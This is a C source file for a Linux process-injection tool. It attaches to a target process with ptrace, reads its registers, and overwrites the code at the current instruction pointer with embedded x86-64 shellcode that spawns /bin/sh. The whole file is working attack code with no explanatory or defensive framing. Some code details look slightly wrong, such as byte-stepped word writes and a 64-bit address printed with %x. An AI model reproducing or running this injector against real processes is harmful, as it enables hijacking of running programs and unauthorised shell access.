#include<stdio.h>
#include<stdlib.h>
#include<stdbool.h>
#include<stdint.h>
#include<string.h>

#include<sys/ptrace.h>
#include<sys/user.h>
#include<sys/wait.h>

bool AttachToPID( unsigned int __pid );
bool GetRegisters(
				struct user_regs_struct *__regs,
				unsigned int __pid
		 );
bool InjectShellcode(
				struct user_regs_struct *__regs,
				//void *__rip,
				unsigned int __pid,
				unsigned int __shellcode_size
		    );
bool DetachFromPID( unsigned int __pid );

char _shellcode_[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
        	     	   "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
           	     	   "\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
        	         "\x0f\x05"; //			/bin/sh
				         //			linux x64 bit


int main(
		int argc,
		char ** argv
	) {

	unsigned int pid = atoi(argv[1]);
	struct user_regs_struct ASSEMREGS;
	bool attached = AttachToPID( pid );
	printf("\033[0m[+] Process Attachment Status: %s\n", attached?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");

	wait(NULL);
	bool registered = GetRegisters( &ASSEMREGS, pid );
//	if((ptrace(PTRACE_GETREGS, pid, 0, &ASSEMREGS)) < 0) {
//		 registered = false;
//	} else { registered = true; }
	printf("[+] Registers Read Status: %s\n", registered?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");

	printf("[+] Injecting Shellcode Into Current RIP Address [%x]\n", ASSEMREGS.rip);
	bool injected = InjectShellcode( &ASSEMREGS, pid, sizeof(_shellcode_) );
	printf("[+] Injection Status: %s\n",  injected?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");

	printf("\nDetaching ... ");
	bool detached = DetachFromPID( pid );
	if (detached) printf("Done.\n");
	return 0;
}


bool AttachToPID( unsigned int __pid ) {
	if((ptrace(PTRACE_ATTACH, __pid, NULL, 0)) < 0) return false;
	return true;
}
bool GetRegisters(
				struct user_regs_struct *__regs,
				unsigned int __pid
		 ) {
	if((ptrace(PTRACE_GETREGS, __pid, 0, *(&__regs))) < 0) return false;
	return true;
}
bool InjectShellcode(
				struct user_regs_struct *__regs,
				//void *__rip,
				unsigned int __pid,
				unsigned int __shellcode_size
		    ) {
	for(int i = 0; i < __shellcode_size; i++) ptrace(PTRACE_POKETEXT, __pid, __regs->rip+i, *(int*)(_shellcode_ + i));
	return true;
}
bool DetachFromPID( unsigned int __pid ) {
	if((ptrace(PTRACE_DETACH, __pid, NULL, 0)) < 0) return false;
	return true;
}
